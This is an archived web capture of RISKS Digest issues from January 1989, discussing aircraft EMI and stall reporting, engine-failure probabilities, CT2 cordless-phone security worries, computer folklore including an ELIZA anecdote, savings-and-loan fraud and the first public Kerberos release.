weapon delivered without having EMI (electromagnetic interference) looked
at completely," Quisenberry said.
   The havoc radio waves can cause was first made public in 1987, when
Knight-Ridder reported that some Army safety officials believe the
phenomenon was responsible for up to five crashes of the Army's UH-60 Black
Hawk helicopters that had killed 22 servicemen since 1982.

[The Blackhawk problem was discussed in <A HREF="/Risks/5.56.html">RISKS-5.56</A>,58,59,60 and 7.8,9 -- GD]

Gordon Davisson  (gordon@june.cs.washington.edu) (uw-beaver!uw-june!gordon)
Computer Science Department, University of Washington.  Seattle, WA, 98195.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
F-16 that can't stall falls from sky (<A HREF="/Risks/8.13.html">RISKS-8.13</A>) 
</A>
</H3>
<address>
Mike Tanner
&lt;<A HREF="mailto:tanner@cis.ohio-state.edu ">
tanner@cis.ohio-state.edu 
</A>&gt;
</address>
<i>
23 Jan 89 23:11:12 GMT
</i><PRE>

This may not be a risk of computers, but maybe a risk that arises from
reporting technical subjects in the popular press -- inaccuracy.

Airplanes can be stalled in any attitude (angle with respect to the ground) at
any airspeed.  So I'm puzzled about this:

&gt; The F-16 can stall at speeds of 230 mph or slower, depending on its weight
&gt; and angle of flight, MacDill officials said.

It might mean that below 230 the computer anti-stall stuff doesn't work.
Though I can't see why it should be related to speed.  Stall is a function of
angle of attack, not of airspeed.  There is a certain speed (called
maneuvering speed in light airplanes, don't know about fighters) beyond which
the airplane will be damaged by a stall.  So maybe 230 is this speed for the
F-16.  That is, below 230 it's a stall, above 230 it's an in-flight breakup.

Then there's this:

&gt; The report drawing depicts Johnson's jet in a near-vertical climb just before
&gt; it stalled.  "That should never have happened," said Howard Acosta

Since Acosta is said to be an experienced pilot I assume "That" refers to the
stall, not the vertical climb.  Though the latter is implied by the context.
Again, stall is a function of angle of attack, not attitude (i.e., angle with
the ground).  Some reporter believes, or was led to believe, that "stall"
is caused by an extreme nose-high attitude.

Anybody know how the F-16's anti-stall stuff really works?
                                                                -- mike

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: Probability and Product Failure [common mode failures]
</A>
</H3>
<address>
&lt;<A HREF="mailto:"Bruce_Hamilton.OsbuSouth"@Xerox.COM">
"Bruce_Hamilton.OsbuSouth"@Xerox.COM
</A>&gt;
</address>
<i>
26 Jan 89 13:11:50 PST (Thursday)
</i><PRE>

It's worth pointing out that common mode failures in software go beyond the
system specification -- programmers tend to make similar sorts of errors way
down in the implementation, even in so-called "independent" implementations.

Re: aircraft-specific common mode failures: exhausted fuel has happened
within the past two years; contaminated fuel would be another example.  I'm
sure an aircraft engineer could come up with dozens of other possibilities.

--Bruce      UUCP: xerox.com!hamilton.osbuSouth     213/333-8075

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Discrete probability and airplanes
</A>
</H3>
<address>
Dave Settle 
&lt;<A HREF="mailto:dave@ucms.UUCP">
dave@ucms.UUCP
</A>&gt;
</address>
<i>
Wed, 25 Jan 89 11:46:16 GMT
</i><PRE>

In RISKS 8.10 Steve Jay &lt;shj@ultra.com&gt; comments:
&gt; &gt; Even assuming that a 3 engined plane needs 2 engines to fly,
&gt; &gt; the odds of 2 engines failing on a 3 engined plane are much, much
&gt; &gt; smaller than the odds of 1 engine failing on a 2 engined plane.

Not true. It is MORE likely to happen.

In RISKS 8.12 Mike Olson &lt;mao@blia.uucp&gt; comments:
&gt; If the probability of 1 engine failing is p, then the probability of one
&gt; of 3 engines failing is 3p ...

Not true either. [ if 'p' is a probability, then '3p' isn't: suppose p = .5?]
		(mind you, you wouldn't sell many of them :-)
     [Wrong.  `3p' is an approximation that is perfectly good for small p. PGN]

To put things straight about probabilities: (assuming that the 2-engine plane
needs 1 engine to fly, and that the 3-engine plane needs 2)

A 2 engined plane will crash iff both engines fail - probability p^2.
Call this p2.

A 3 engined plane will crash iff any pair of engines fail, or if all 3 fail
together.

The probability of a pair of engines failing is p * p * (1 - p): i.e.
FAIL FAIL OK. There are 3 DIFFERENT pairs to be considered: AB, BC, or AC.

The probability of all three engines failing is p^3.

Therefore the probability of at least 2 engines failing is:
	3p^2(1 - p) + p^3 = 3p^2 - 2p^3. 	Call this p3.

p2 is the probability that the 2-engined plane will crash, p3 is the probability
that the 3-engined plane will crash.

Since p &lt; 1, p2 &lt; p3 (that is, the 2-engined plane is safer):
proof:
	p^2 &lt; 3p^2 - 2p^3 
	0 &lt; 2p^2 - 2p^3			(subtract p^2)
	2p^3 &lt; 2p^2			(add 2p^3)
	p^3 &lt; p^2			(divide by 2)

which is TRUE for p &lt; 1.

So, what does all this mean? Well, basically it's safer to use a 2-engined plane
than a 3-engined plane: the 3-engined plane will crash more often, assuming
that it needs 2 engines to fly.

You can sort of make sense of this by thinking that the 2-engine plane needs
50% of its engines working, while the 3-engine plane needs 66%.
Of course, you could always travel by Greyhound.

Hope this makes sense (and I haven't made any mistakes :-) )

[Thanks to Martin Jeffries for help with the maths etc]

Dave Settle, Universal (CMS) Ltd, Thames Tower, Burleys Way, Leicester, UK.

dave@ucms.co.uk	 (someday)		...!mcvax!ukc!nott-cs!ucms!dave
dave@ucms.uucp 	  (today)

		&lt;--- This way to point of view ---&gt;

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Micro-cellular phones
</A>
</H3>
<address>
&lt;<A HREF="mailto:denbeste@BBN.COM">
denbeste@BBN.COM
</A>&gt;
</address>
<i>
Sun, 22 Jan 89 11:22:02 -0500
</i><PRE>

Excerpted from the 1/30/89 Business Week:

  "...Now the British are readying a novel mobile phone service based not on
cellular technology but on cordless phones. Customers will have to place
calls within range of a local transceiver, and they won't be able to receive
calls.  [The customer must stay near that transceiver for the duration of
the call.  SDB]
  "...The cordless phones will transmit signals to large transceivers tucked
away in key public places and connected by wire to the regular phone
network. As long as the caller is within 100 to 200 yards of a station, a
call can be placed to anywhere in the world by punching in a special code
and then the number.
  "...License applicants figure it will take no more than $70 million to
build a nationwide network of 20,000 base stations, placed in such busy
sites as train terminals and gas stations.
  "...Initially the phones will retail for about $275 in Britain..."
  "...Telepoint's boosters expect Britain to be a $1.4 billion market with 4
million subscribers by 1994.
  "...British consumers soon will be able to buy a small CT2 base station
[for their homes] for about $200, and use it in place of a regular phone and
expensive wiring to connect up to eight CT2 cordless handsets.
  "...On each call, a CT2 phone finds the first available frequency among 40
channels. Backers say its low power output means that up to 14,000 phones
could operate simultaneously per square mile.
  "...Telepoint's backers are betting that the new service will attract
enough cost-conscious consumers to turn a quid or two. [because CT2 costs
much less than a real cellular system SDB]"

This takes my breath away. Are there NO paranoids in the British telephone
authority?

1. What is to keep me from setting up a receiver in the London financial
district and listening in on important calls there? [Did someone mention
"inside trading"? How the heck are the authorities going to prove where I got
my information?]

2. The "special code" I have to enter is presumably a customer ID. [If they
expect an installed base of 4 million, it's probably going to be 11 digits. How
much you want to bet they make the phone do it automatically?] If I put my
receiver somewhere rich (the financial district again?) I should be able in
very short order to capture the access codes for literally hundreds of very
well-off people. All I have to do now is modify my own phone slightly, and next
time I want to chat with my girl friend in Singapore for a couple of hours,
there I am - free long distance!

If the phone company detects something funny going on with a normal line, they
know exactly where it is and can send the cops. But with one of these, all they
know is approximately where it is - and a 200 yard diameter is a big place to
search when you don't know what you are looking for and don't have warrants to
open doors and search.

These problems are fundamental in the design. Because they will have an
enormous installed base, they can't change the fundamental system at all - by
adding scramblers, for instance, or changing the tones for the keypad. Once the
system is installed, I don't see what they can do to handle these problems when
they pop up.

"Cost conscious consumers" indeed. If the engineering schools at Oxford and
Cambridge are anything like the ones at MIT and Caltech, they're going to tear
this system to shreds.

Steven C. Den Beste,   BBN Communications Corp., Cambridge MA
denbeste@bbn.com(ARPA/CSNET/UUCP)    harvard!bbn.com!denbeste(UUCP)

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Looking for Computer Folklore
</A>
</H3>
<address>
Vernard C. Martin
&lt;<A HREF="mailto:isusevm%pyr@gatech.edu ">
isusevm%pyr@gatech.edu 
</A>&gt;
</address>
<i>
26 Jan 89 01:18:40 GMT
</i><PRE>

I'm interested in stories that might have started in actual fact but that have
become so popular that they keep popping up. For instance, did you hear about
the zero-sum check? Someone gets a computerized bill from a credit card company
saying they owe the company zero dollars and zero cents. They ignore it but
keep getting bills and increasingly nasty computerized notes, so they finally
write out a check for zero dollars and zero cents and send it in, and the
computer never bothers them again.

Or, there's the story about the guy who falls asleep in front of his
terminal with an ELIZA program running and his boss logs on and thinks he's
talking to him but is actually talking to the program, and gets pissed off.

OR, there's the dilemma in which computers keep crashing because an operator
wears a silk slip that gives off static electricity like nobody's business, OR
the bank teller who embezzles millions from his bank by creating a file to
collect the fractions of pennies that the bank rounds off from accounts.

Some story categories are: 
1. machines going physically berserk. 
2. women/computers/sex/sexism and/or romance. 
3. sabotage.
4. breaking security (no, I don't have classified clearance [...])
5. great hacks. 
6. computer gods (such as Norbert Weiner, a genius in AI who lost his family
   when they moved to a new house and he forgot where it was). 
7. tales of massive catastrophe due to seemingly mysterious means
   that turn out to be something strange, like magnetized pollen. 

Of course, there are more categories. Got a great tale you want to share? 
Reply to isusevm@pyr.gatech.edu. If you'd rather talk, leave your phone 
number and I'll try to give you a ring. 

Karla Jennings
This account is temporarily being used as a collection point for mail. 
isusevm@pyr.gatech.edu  

  [The zero-dollars story appears among an old collection of anecdotes from
  an ACM SIGOPS Symposium on Operating Systems Principles, contained in
  ACM Software Engineering Notes vol 5 no 1 (Jan 1979) and augmented in vol 
  7 no 1 (Jan 1981).  I hope our readers will share their documentable true
  tales (that have become legends) with RISKS as well as Karla -- especially
  those that have not appeared here yet.  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.15.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.17.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-67</DOCNO>
<DOCOLDNO>IA012-000131-B037-308</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.17.html 128.240.150.127 19970217025311 text/html 17950
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:51:41 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 17</TITLE>
<LINK REL="Prev" HREF="/Risks/8.16.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.18.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.16.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.18.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 17</H1>
<H2> Friday 27 January 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  ELIZA and Joe Weizenbaum 
</A>
<DD>
<A HREF="#subj1.1">
Bard Bloom
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Savings, Loans, and Easy Money 
</A>
<DD>
<A HREF="#subj2.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Risks of inept management ["Losing Systems"] 
</A>
<DD>
<A HREF="#subj3.1">
John R. Levine
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  MIT Athena Kerberos Authentication System available for FTP     
</A>
<DD>
<A HREF="#subj4.1">
John Kohl via Jon Rochlis
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Single-engine planes 
</A>
<DD>
<A HREF="#subj5.1">
Phil Karn
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Multi-engine airplanes 
</A>
<DD>
<A HREF="#subj6.1">
Craig Smilovitz
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
ELIZA and Joe Weizenbaum
</A>
</H3>
<address>
&lt;<A HREF="mailto:bard@theory.lcs.mit.edu                      [Bard Bloom, it seems.  PGN]">
bard@theory.lcs.mit.edu                      [Bard Bloom, it seems.  PGN]
</A>&gt;
</address>
<i>
Thu, 26 Jan 89 22:48:52 EST
</i><PRE>

&gt; Or, there's the story about the guy who falls asleep in front of his
&gt; terminal with an ELIZA program running and his boss logs on and thinks he's
&gt; talking to him but is actually talking to the program, and gets pissed off.

This may have actually happened. Joseph Weizenbaum (MIT professor, author of
_Computer Power and Human Reason_) told the anecdote in a class, with himself
as one of the actors.  It went something like this -- some of this is
doubtless my own memory inventing things.  The dialogue is partially courtesy
of GNU Emacs' Eliza program, and the rest is made up.

Weizenbaum had recently written ELIZA on one of the MIT AI Lab's
computers.  In those days, computers were rather weak.  The computer in
question had a time-sharing system on it, yes, but it got rather sluggish
when two people were using it at the same time.  Weizenbaum left ELIZA
running one evening and went home.  

That evening (around 4 a.m.), another AI Lab person was trying to get his
program working for a demonstration to his funding agency the next day, and
it wasn't working very well.  He was using the computer Weizenbaum was logged
on to, and decided that he needed the whole thing.  He went to Weizenbaum's
office, hoping that he could persuade Weizenbaum to log off.

When he got there, Weizenbaum was nowhere to be found, and his terminal was
on (and blank).  The AIist thought that Weizenbaum was working from home, and
had slaved his office terminal to his home one.  So, he typed "Joe, please
log off."

"WHY DO YOU SAY JOE LOG OFF?"

"I need the computer for an AI demo tomorrow, Joe"

"WHAT MAKES YOU BELIEVE THAT?"

"Joe, I'm serious.  I've got a demo here tomorrow and I need the computer."

"PERHAPS THE PEOPLE YOU HANG AROUND WITH COULD HAVE CAUSED THIS."

After a few more exchanges like this, the AIist decided that Joe was being
very obnoxious, and called him at home to scream at him.  "Joe!  You *******!
Why are you doing this to me?"

Recall that it was four in the morning, and that Weizenbaum had no idea that
his creation was running amuck in the AI lab.  He quite reasonably replied,
"Why am I doing _what_ to you?"  This sounded so much like what ELIZA had
been saying that it was hard to convince the AIist that it hadn't been
Weizenbaum on the terminal.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Savings, Loans, and Easy Money 
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Fri, 27 Jan 1989 10:16:40 PST
</i><PRE>

Although the computer roles are probably insignificant, the scope of the abuses
in the savings and loan insolvencies (estimates are approaching $100 billion
just in bail-out money) are such that upwards of 20% of the cases are alleged
to involve fraud.  The incentives seem rather simple -- set up an apparently
legitimate S&amp;L, make all sorts of loans to friends, let them all default, and
then let the government pick up the pieces for the legitimate investors.  Three
of the nation's largest CPA firms -- Deloitte Haskins &amp; Sells, Coopers &amp;
Lybrand, and Touche Ross &amp; Co., plus smaller firms, have been sued for their
roles in failing to detect fraud.  Another large firm, Arthur Young, proclaimed
Vernon S&amp;L of Dallas clean shortly before federal regulators declared it
insolvent -- because 90% of its loans were bad.  Whatever the mixture of
mismanagement, incompetence, fraud, and other factors turns out to be, the
situation seems pervasive.  Why were the auditors were out to lunch?

Even if the era of decontrol were ended, it seems that a such widespread
problem could not be aided by better computerization (knowing what we know
about rigging computer systems, it might make fraud even easier!) -- except
possibly in providing better on-line data for the auditors that might simplify
their task of rectifying computer records with reality.  Overall, enormous
amounts of money seem to encourage fraud and creative mismanagement.  Computer
systems designed to withstand misuse by one user will no longer suffice.
Separation of duties and the principle of least privilege help a little, but
massive collusions may become the order of the day, in which case checks and
balances -- even on the auditors -- become critical.  Who checks the checkers?

As far as who pays, I imagine that because of the S&amp;L incorporation rules there
will be no deep pockets other than the taxpayers and S&amp;L customers.  So the
real culprits will probably go untapped.  But recall the advice of Deep Throat:
``Follow the Money.''

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Risks of inept management, was "Losing Systems"
</A>
</H3>
<address>
John R. Levine
&lt;<A HREF="mailto:johnl@ima.isc.com ">
johnl@ima.isc.com 
</A>&gt;
</address>
<i>
Sun, 22 Jan 89 23:16:13 EST
</i><PRE>

In issue 12, Keane Arase details a story of a botched data collection
manufacturing package at a large company which I assume to be Procter and
Gamble.  He reported on staff turnover, bad hiring, insufficient resources,
bad design, and a host of other terrible problems.  He points out that some
of the trouble could be traced to bad management.  It sounds to me like all
of the trouble was due to bad management.  Although large computing projects
are often plagued by management problems, such difficulties are by no means
unique to the computing business.

For example, he points out that his department was made a profit center with
profits measured quarterly even though the system wasn't expected to be
profitable for two years.  Normally under the profit center model, separate
centers are supposed to deal with each other as though they were separate
businesses, i.e. the client department should be making progress payments or
the computer department should have some provision for treating the
progressing project as a growing asset.  Accounting of multi-year projects is
hardly an unknown art, the construction business has been doing that at least
since the time of the Pyramids.

Finally, problems of under- or mis-specification aren't unique to the
computer industry either.  In New Haven CT there is (was? it may have been
torn down by now) an extremely badly built pre-fab housing project called
Oriental Gardens.  It had no rain gutters, letting in the rain and snow to
cause all sorts of damage.  Why?  The houses were partially constructed at a
factory, then transported and assembled on-site.  The factory expected the
gutters to be added on-site, the on-site expected them already to be on the
houses when they arrived.

The message here is that project management is a real problem, but it isn't
really a technological problem except where traditional project management
techniques fail to handle unique aspects of computer systems.  There is a lot
of management knowledge to be had for those that want it.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
MIT Athena Kerberos Authentication System available for FTP
</A>
</H3>
<address>
Jon Rochlis 
&lt;<A HREF="mailto:jon@BITSY.MIT.EDU">
jon@BITSY.MIT.EDU
</A>&gt;
</address>
<i>
Thu, 26 Jan 89 22:18:39 EST
</i><PRE>

What is Kerberos and why is it needed?

In an open network computing environment a workstation cannot be trusted to
identify its users correctly to network services.  Software on the workstations
may not be trustworthly, so being a privileged user on a workstation is not a
meaningful test of authenticity.  Source network addresses are so easily forged
that they are are meaningful either.  Passwords sent uncrypted on the network
are vulnerable to wiretappers.  Kerberos provides an alternative approach
whereby a trusted third-party encryption-based authentication service is used
to verify users' identities.  Much more information is available with the
documentation (see below).

How to get it:

The first public release of the Kerberos Authentication System is ready
for retrieval.  Initial distribution will be by anonymous
FTP; eventually 9-track tapes will be available.

To retrieve the distribution, ftp to ATHENA-DIST.MIT.EDU (18.71.0.38),
login as anonymous (password whatever you like, usually your
username@host), then cd to pub/kerberos.

Retrieve README.ftp, it has directions on how to get to the rest of the
software.

Distribution is split compressed tar files (xxx.Z.aa, xxx.Z.ab, ...).

If you would like to retrieve documents separately, you can get them
from pub/kerberos/doc (documents) or pub/kerberos/man (manual pages).
If you prefer hardcopy of the documentation, send your address and request
to "info-kerberos@athena.mit.edu".

If you would like to be put on the Kerberos e-mail list
("kerberos@athena.mit.edu"), send your request to 
"kerberos-request@athena.mit.edu".

I would like to thank the following people for their assistance in
getting Kerberos in shape for release:

  Andrew Borthwick-Leslie,  Bill Bryant,  Doug Church,  Rob French,  Dan Geer, 
  Andrew Greene,  Ken Raeburn,  Jon Rochlis,  Mike Shanzer,  Bill Sommerfeld,
  Jennifer Steiner,  Win Treese,  Stan Zanarotti.

FYI, the copyright notice:

  Copyright (C) 1989 by the Massachusetts Institute of Technology

   Export of this software from the United States of America is assumed
   to require a specific license from the United States Government.
   It is the responsibility of any person or organization contemplating
   export to obtain such a license before exporting.


WITHIN THAT CONSTRAINT, permission to use, copy, modify, and distribute this
software and its documentation for any purpose and without fee is hereby
granted, provided that the above copyright notice appear in all copies and that
both that copyright notice and this permission notice appear in supporting
documentation, and that the name of M.I.T. not be used in advertising or
publicity pertaining to distribution of the software without specific, written
prior permission.  M.I.T. makes no representations about the suitability of
this software for any purpose.  It is provided "as is" without express or
implied warranty.
                     John Kohl, MIT Project Athena/Kerberos Development Team

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Single-engine planes (Re: <A HREF="/Risks/8.15.html">RISKS-8.15</A>)
</A>
</H3>
<address>
Phil Karn
&lt;<A HREF="mailto:karn@ka9q.bellcore.com ">
karn@ka9q.bellcore.com 
</A>&gt;
</address>
<i>
Thu, 26 Jan 89 02:46:29 EST
</i><PRE>

My friend, Brian Lloyd, and his dad, former California congressman Jim
Lloyd, flew their single engine Piper Commanche across the Atlantic from
Gander to Shannon to visit the Paris Air Show a few years ago. They firmly
believe that small planes with single engines are more reliable than small
twin-engine planes, and they decided to demonstrate it.

Halfway across the pond, they're making one of their routine hourly position
reports with a passing British Air 747. After the formalities, the following
conversation ensues:

BA pilot: What're ya flying down there, 448 Poppa?

Brian: A Piper Commanche.

BA pilot: That's a TWIN Commanche, right?

Brian: Nope, single.

(long pause)

BA pilot: You're mad, you're absolutely mad, you know that! One engine??
I've got four!

Brian's dad: Well, that's just three more things to go wrong!

BA pilot: You've got me there, I've had to shut one down already!

As you can see, they lived to tell the tale...

--Phil

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Multi-engine airplanes
</A>
</H3>
<address>
Craig Smilovitz 
&lt;<A HREF="mailto:smiley@Think.COM">
smiley@Think.COM
</A>&gt;
</address>
<i>
Fri, 27 Jan 89 09:39:26 est
</i><PRE>

    In the discussion about multi-engine aircraft failures, we've seen a
lot of mathematical probability exercises that forget about analyzing the
basis assumption about probability theory.  That assumption is the
*independence* of the events in question.

    Taking just the two engine example, everyone has been talking about
the chance of a single engine failing as p.  Thus the chance of an engine 
failing on a two engine plane is 2p (for small p, as has been pointed out).
But then it has been assumed that the chance of the second engine failing
is p.  That would be true if the engine failures were independent.  But
this is not the case.  A two engine plane flying on one engine is applying
more stress and wear to the engine than normal (since it is probably running
at close to full design capacity)  Thus the chance of this remaining engine
failing is more than p.  How much more answers the question of whether a
two or a three engine plane is safer.  The second p is a function of all
sorts of mechanical factors that would only be known through a careful
study of the design af an individual airplane type and is probably
different for every single plane marketted.  (The airframe and other
critical systems are similarly more likely to fail on a plane that is
running without its full complement of engines). 
   Engine failures are also not independent in another way.  In a very
recent crash, a pilot of a two engine plane got an indicator that one
engine was on fire.  He turned off an engine.  Due to an unknown cause
(pilot error, miswiring?) the wrong engine was turned off.  On this flight
two engines 'failed' even though one was in working order.  From an engine
designers standpoint, you might say that only one engine failed, but the
plane still crashed.  It could even be conceivable that a three engine
plane after this occurence could get enough thrust from its remaining
engine to allow a restart of the engine turned off in error.
   But the survivability of a three engine plane in this case is not my
point.  The point is that engine failures are not necessarily independent
events when talking about engines on a multiple engine plane.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.16.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.18.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-68</DOCNO>
<DOCOLDNO>IA012-000131-B037-339</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.18.html 128.240.150.127 19970217025330 text/html 26840
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:51:52 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 18</TITLE>
<LINK REL="Prev" HREF="/Risks/8.17.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.19.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.17.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.19.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 18</H1>
<H2> Monday 30 January 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Hong Kong computer horse betting 
</A>
<DD>
<A HREF="#subj1.1">
George Moore
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Keycard badges vs. anti-shoplift systems 
</A>
<DD>
<A HREF="#subj2.1">
Bruce Hamilton
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Bank Fraud 
</A>
<DD>
<A HREF="#subj3.1">
Peter Golde
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Crashing a PDP-11/40 (Computer Folklore) 
</A>
<DD>
<A HREF="#subj4.1">
Jeff Makey
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Sprint to the Finish? 
</A>
<DD>
<A HREF="#subj5.1">
Steve Philipson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Information Security/Computer Crime Statistics 
</A>
<DD>
<A HREF="#subj6.1">
Stan Stahl
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: ELIZA and Joe Weizenbaum 
</A>
<DD>
<A HREF="#subj7.1">
Bernie Cosell
</A><br>
<A HREF="#subj7.2">
 Bob Krovetz
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
